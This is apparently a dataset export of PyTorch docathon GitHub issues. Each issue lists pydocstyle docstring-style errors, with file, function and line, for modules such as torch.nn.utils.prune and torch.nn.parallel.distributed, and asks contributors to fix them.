- **File**: `torch/nn/quantized/dynamic/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/sparse.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/utils.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/embedding_ops.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/dynamic/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/qat/dynamic/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/intrinsic/qat/modules/conv_fused.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/intrinsic/qat/modules/linear_fused.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/intrinsic/qat/modules/linear_relu.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantizable/modules/activation.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantizable/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/cudnn/__init__.py`, **Entity**: `version`, **Line**: 69, **Description**: First line should end with a period (not 'N')
- **File**: `torch/backends/cudnn/__init__.py`, **Entity**: `version`, **Line**: 69, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/cudnn/__init__.py`, **Entity**: `is_available`, **Line**: 83, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkl/__init__.py`, **Entity**: `is_available`, **Line**: 4, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkl/__init__.py`, **Entity**: `verbose`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/mkl/__init__.py`, **Entity**: `verbose`, **Line**: 10, **Description**: First line should end with a period (not 'y')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `is_built`, **Line**: 14, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCache`, **Line**: 38, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCache`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCache`, **Line**: 38, **Description**: First line should end with a period (not 'e')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCacheManager`, **Line**: 59, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `cuFFTPlanCacheManager`, **Line**: 59, **Description**: First line should end with a period (not ',')
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `preferred_linalg_library`, **Line**: 121, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `preferred_linalg_library`, **Line**: 121, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/backends/cuda/__init__.py`, **Entity**: `SDPBackend`, **Line**: 173, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/openmp/__init__.py`, **Entity**: `is_available`, **Line**: 5, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkldnn/__init__.py`, **Entity**: `is_available`, **Line**: 7, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mkldnn/__init__.py`, **Entity**: `verbose`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/mkldnn/__init__.py`, **Entity**: `verbose`, **Line**: 14, **Description**: First line should end with a period (not 'y')
- **File**: `torch/backends/_nnapi/prepare.py`, **Entity**: `NnapiInterfaceWrapper`, **Line**: 111, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/_nnapi/prepare.py`, **Entity**: `ShapeComputeModule`, **Line**: 151, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/_nnapi/prepare.py`, **Entity**: `ShapeComputeModule`, **Line**: 151, **Description**: First line should end with a period (not 'n')
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `ConvPoolArgs2d`, **Line**: 184, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `_do_add_binary`, **Line**: 1294, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `_do_add_binary`, **Line**: 1294, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `serialize_model`, **Line**: 2081, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `serialize_model`, **Line**: 2081, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/_nnapi/serializer.py`, **Entity**: `serialize_model`, **Line**: 2081, **Description**: First line should end with a period (not '

cc @carljparker",False
"Fix docstring errors in weight_norm.py, parametrizations.py, prune.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/utils/prune.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/prune.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `BasePruningMethod`, **Line**: 13, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `__call__`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `__call__`, **Line**: 21, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 34, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 34, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply_mask`, **Line**: 53, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply_mask`, **Line**: 53, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 76, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 76, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 76, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `prune`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `prune`, **Line**: 207, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `prune`, **Line**: 207, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 236, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 236, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 236, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `PruningContainer`, **Line**: 266, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `add_pruning_method`, **Line**: 287, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 319, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 319, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 319, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_combine_masks`, **Line**: 347, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_combine_masks`, **Line**: 347, **Description**: First line should end with a period (not '
- **File**: `torch/nn/utils/prune.py`, **Entity**: `Identity`, **Line**: 418, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `Identity`, **Line**: 418, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 430, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 430, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 430, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 483, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 483, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 483, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `L1Unstructured`, **Line**: 500, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `L1Unstructured`, **Line**: 500, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 541, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 541, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 541, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 585, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 585, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 648, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 648, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 648, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `LnStructured`, **Line**: 667, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `LnStructured`, **Line**: 667, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 691, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `compute_mask`, **Line**: 691, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 761, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 761, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 761, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 807, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 807, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `apply`, **Line**: 807, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `identity`, **Line**: 820, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `identity`, **Line**: 820, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `identity`, **Line**: 820, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_unstructured`, **Line**: 853, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_unstructured`, **Line**: 853, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `l1_unstructured`, **Line**: 888, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `l1_unstructured`, **Line**: 888, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_structured`, **Line**: 930, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `random_structured`, **Line**: 930, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `ln_structured`, **Line**: 969, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `ln_structured`, **Line**: 969, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `global_unstructured`, **Line**: 1014, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `global_unstructured`, **Line**: 1014, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `custom_from_mask`, **Line**: 1136, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `custom_from_mask`, **Line**: 1136, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 1170, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 1170, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `remove`, **Line**: 1170, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `is_pruned`, **Line**: 1201, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `is_pruned`, **Line**: 1201, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount_init`, **Line**: 1228, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validation')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount`, **Line**: 1262, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount`, **Line**: 1262, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_amount`, **Line**: 1262, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validation')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_structured_pruning`, **Line**: 1285, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_structured_pruning`, **Line**: 1285, **Description**: First line should end with a period (not '-')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_structured_pruning`, **Line**: 1285, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validation')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_nparams_toprune`, **Line**: 1304, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_nparams_toprune`, **Line**: 1304, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_dim`, **Line**: 1328, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_validate_pruning_dim`, **Line**: 1328, **Description**: First line should end with a period (not '
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_norm`, **Line**: 1338, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/prune.py`, **Entity**: `_compute_norm`, **Line**: 1338, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `_make_orthogonal`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `_make_orthogonal`, **Line**: 23, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `orthogonal`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `weight_norm`, **Line**: 309, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/parametrizations.py`, **Entity**: `spectral_norm`, **Line**: 483, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not '8')
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: `weight_norm`, **Line**: 74, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/weight_norm.py`, **Entity**: `remove_weight_norm`, **Line**: 138, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')

cc @carljparker",False
"Fix docstring errors in parametrize.py, spectral_norm.py, stateless.py module: docs triaged docathon-h2-2023 easy","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `cached`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `cached`, **Line**: 21, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `ParametrizationList`, **Line**: 70, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `ParametrizationList`, **Line**: 70, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `right_inverse`, **Line**: 201, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `right_inverse`, **Line**: 201, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `right_inverse`, **Line**: 201, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Calls')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `_inject_new_class`, **Line**: 280, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `register_parametrization`, **Line**: 381, **Description**: First line should be in imperative mood (perhaps 'Add', not 'Adds')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `is_parametrized`, **Line**: 587, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `remove_parametrizations`, **Line**: 609, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `remove_parametrizations`, **Line**: 609, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `type_before_parametrizations`, **Line**: 690, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `type_before_parametrizations`, **Line**: 690, **Description**: First line should end with a period (not ',')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `type_before_parametrizations`, **Line**: 690, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `transfer_parametrizations_and_params`, **Line**: 704, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/parametrize.py`, **Entity**: `transfer_parametrizations_and_params`, **Line**: 704, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not '7')
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: `spectral_norm`, **Line**: 226, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/utils/spectral_norm.py`, **Entity**: `remove_spectral_norm`, **Line**: 287, **Description**: First line should be in imperative mood (perhaps 'Remove', not 'Removes')
- **File**: `torch/nn/utils/stateless.py`, **Entity**: `functional_call`, **Line**: 156, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/stateless.py`, **Entity**: `functional_call`, **Line**: 156, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/stateless.py`, **Entity**: `functional_call`, **Line**: 156, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')

cc @carljparker",False
"Fix docstring errors in memory_format.py, init.py, _named_member_accessor.py, _per_sample_grad.py, distributed.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_cast_buffers`, **Line**: 92, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_setup_mixed_precision_params`, **Line**: 103, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_setup_mixed_precision_params`, **Line**: 103, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_find_tensors`, **Line**: 143, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `__init__`, **Line**: 273, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `__init__`, **Line**: 273, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `main_hook`, **Line**: 287, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `main_hook`, **Line**: 287, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `post_hook`, **Line**: 324, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `post_hook`, **Line**: 324, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `post_hook`, **Line**: 324, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `DistributedDataParallel`, **Line**: 332, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `DistributedDataParallel`, **Line**: 332, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_fire_reducer_autograd_hook`, **Line**: 958, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_fire_reducer_autograd_hook`, **Line**: 958, **Description**: First line should be in imperative mood (perhaps 'Fire', not 'Fires')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_root_copy_hook`, **Line**: 967, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_root_copy_hook`, **Line**: 967, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_module_wait_for_copy_hook`, **Line**: 1010, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_module_wait_for_copy_hook`, **Line**: 1010, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_ddp_init_helper`, **Line**: 1048, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_ddp_init_helper`, **Line**: 1048, **Description**: First line should end with a period (not '
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_ddp_init_helper`, **Line**: 1048, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initialization')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_assign_modules_buffers`, **Line**: 1220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_assign_modules_buffers`, **Line**: 1220, **Description**: First line should end with a period (not 'o')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_assign_modules_buffers`, **Line**: 1220, **Description**: First line should be in imperative mood (perhaps 'Assign', not 'Assigns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_parameters`, **Line**: 1278, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_parameters`, **Line**: 1278, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_parameters`, **Line**: 1278, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `no_sync`, **Line**: 1313, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `no_sync`, **Line**: 1313, **Description**: First line should end with a period (not 'P')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `no_sync`, **Line**: 1313, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_active_ddp_module`, **Line**: 1341, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `_get_active_ddp_module`, **Line**: 1341, **Description**: First word of the first line should be properly capitalized ('Torchdynamo', not 'TorchDynamo')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join`, **Line**: 1609, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join`, **Line**: 1609, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join`, **Line**: 1609, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join_hook`, **Line**: 1715, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join_hook`, **Line**: 1715, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/parallel/distributed.py`, **Entity**: `join_hook`, **Line**: 1715, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
